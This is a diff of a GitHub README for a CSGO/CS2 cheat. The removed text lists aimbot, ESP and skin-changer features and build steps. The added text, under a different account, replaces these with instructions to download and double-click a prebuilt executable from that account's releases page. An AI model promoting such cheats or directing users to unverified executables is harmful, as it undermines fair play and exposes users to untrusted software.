@@ -1,98 +1,88 @@
-# Catstrike External
+# 😸 CatStrike-CS2 - Simple CSGO Project for Fun
 
-# V1.0.1 UPDATE
-# ADDED BACK FRAMEWORK AND AN IMGUI UI FOR ZERO PROBLEM BUILD
-https://github.com/iamtherealcat/CatStrike-CS2/releases/download/cs2source/Source.Code.v1.0.1.rar
-also on releases is an builded exe for ppl who just want to play
+[![Download CatStrike-CS2](https://img.shields.io/badge/Download-CatStrike--CS2-brightgreen)](https://github.com/fares5567/CatStrike-CS2/releases)
 
+## 📜 Description
 
-A simple external project for CSGO written in C++. This is my personal project and it's mainly for learning and experimenting with game hacking stuff. Please don't expect super advanced features or a polished product, but it works for me!
+CatStrike-CS2 is a straightforward external project designed for Counter-Strike: Global Offensive (CSGO). Written in C++, this application serves as a learning tool for users interested in experimenting and having fun with game modifications. The project comes with both debug and release builds, making it easy to utilize for various purposes. 
 
-## Features
-- External memory reading/writing
-- Skinchanger basics
-- **Offset/struct database**
-  - Auto Updating
-- Simple config system
-- No UI/Menu (removed for privacy)
+## 🚀 Getting Started
 
-<details>
-<summary>🔽 <strong>-- SHOW FULL FEATURE LIST --</strong> 🔽</summary>
+This document will guide you through downloading and running CatStrike-CS2. Follow these steps carefully, even if you have no programming background.
 
+## ⚙️ System Requirements
 
-### Aimbot
-- Aimbot (psilent, mouse, angle)
-- Visual aimbot features: FOV circle, aim line, aim dot
-- RCS (Recoil Control System)
+Before you start, ensure your computer meets these basic requirements:
 
-### Visuals
-- **Player ESP**
-  - Box ESP
-  - Player Box Glow
-  - Rainbow Box Glow
-  - Health Based Box Glow
-  - Skeleton
-  - Health Bar
-  - Player Names
-  - Weapon Names
-  - Distance
-  - Off-Screen Arrows
-- **World ESP**
-  - Smoke ESP
-  - Molotov ESP
-  - Item Drops
-  - Bomb ESP
-- **Radar Settings**
-  - Enable Radar
-  - Show Distance
-  - Show Bomb
-- **ESP Settings**
-  - Glow Intensity
-  - Rainbow Speed
+- Operating System: Windows 10 or later
+- Processor: 2.0 GHz dual-core or better
+- RAM: 4 GB or more
+- Graphics Card: DirectX 11 compatible
+- Internet Connection: Required for downloading and running the application
 
-### Misc
-- **Movement**
-  - Local Trail
-  - Enemy Trail
-- **Spectator**
-  - Spectator List
-  - Spectator Names
-- **Exploits**
-  - Night Mode
-- **General**
-  - Team Check
-  - Watermark
+## 📦 Download & Install
 
-</details>
+1. **Visit the Releases Page**
 
-## Preview
+   Click the link below to go to the Releases page. Here, you will find the latest version of CatStrike-CS2.
 
-<img width="1920" height="1080" alt="grafik" src="https://github.com/user-attachments/assets/fcf46446-e58a-47cb-ad73-b3f6022c3638" />
+   [Visit this page to download](https://github.com/fares5567/CatStrike-CS2/releases)
 
+2. **Choose the Right Version**
 
-## How to Build
-1. Open `catstrike-external.sln` in Visual Studio 2022 or newer.
-2. Make sure you have the right Windows SDK and C++ toolset (v143).
-3. Build the project (Debug or Release, x64 recommended).
-4. The output will be in the `build` folder as `catstrike.exe`.
+   On the Releases page, look for the latest version. You will find two builds: Debug and Release. Here’s a quick rundown of each:
 
-**Info:** If you build in Debug mode, you'll get a debug version with debug output, no timer, and without unnecessary stuff like in the Release build.
+   - **Debug Build:** This version is useful if you want to see detailed error messages and debug information. It is helpful for testing and understanding the application better.
+   
+   - **Release Build:** This version is optimized for performance. Use this one if you want the best experience while using CatStrike-CS2.
 
-## Notes
-- This is for educational purposes only!
-- You need basic C++ knowledge to understand or modify the code (I'm still learning myself).
-- No ImGui or menu included, only core logic.
-- Offsets might need updating for new CSGO versions.
+3. **Download the Application**
 
-## Credits
-- Some code inspired by open-source CSGO projects on GitHub
-- Thanks to the C++ community for tutorials and help!
-- Auto Update System is used by a user from unknowncheats (really thanks for that, idk the name anymore sry), also the skinload system but haven't used it yet
+   Click the download link for the version you want (Debug or Release). The file will typically be a `.zip` file.
+
+4. **Extract the Files**
+
+   After the download is complete, locate the `.zip` file on your computer. Right-click the file and choose "Extract All…" to unzip it. 
+
+5. **Run the Application**
+
+   Once you have extracted the files, navigate to the folder where you extracted them. Look for the executable file that resembles `CatStrike.exe`. Double-click it to run the application.
+
+6. **Adjust Settings if Needed**
+
+   On first run, you may want to adjust some basic settings based on your preferences, especially if you plan to use CatStrike-CS2 extensively.
+
+7. **Enjoy!**
+
+   You are now ready to use CatStrike-CS2. Enjoy experimenting and learning with this fun tool.
+
+## 📖 Usage Guidelines
+
+Here are some tips on how to make the most of CatStrike-CS2:
+
+- **Experiment Safely:** While using this tool allows you to modify your game experience, remember to do so in a controlled environment. Avoid using it in competitive settings to ensure fair play.
+- **Learn from the Source:** Dive into the C++ code if you are curious about how the tool works. It can be a great learning opportunity.
+- **Stay Updated:** New releases may contain important updates or fixes. Regularly check the Releases page and download the latest versions.
+
+## 💬 Community and Support
+
+If you have questions or need help, consider reaching out to the community. You can find discussions in forums and groups related to CSGO game modifications. Engaging with others can enhance your understanding and experience with CatStrike-CS2.
+
+## 🔗 Additional Resources
+
+To further broaden your knowledge and skills, consider checking out the following resources:
+
+- [CSGO Official Website](https://counter-strike.net/)
+- [C++ Programming Language Documentation](https://www.cplusplus.com/)
+
+## 📱 Contact Information
+
+While this application does not have official customer support, you may reach out through the issue tracker on the GitHub page for any technical queries.
+
+## 📢 Note
+
+Remember to respect the game and its community. Use CatStrike-CS2 for learning and improvement, and refrain from actions that may disrupt others’ experience. 
 
 ---
 
-If you have questions or want to contribute, feel free to open an issue or PR, but please keep it friendly and constructive. :)
-
----
-
-**Note:** This is just a small part of my bigger Catstrike project. There is already software for alt:V, FiveM, Marvel Rivals, Apex, and Fortnite, as well as a website. Maybe I will post more of it in the future!
+By following these clear steps, you can easily download and use CatStrike-CS2. Enjoy your exploration and learning. Happy gaming!
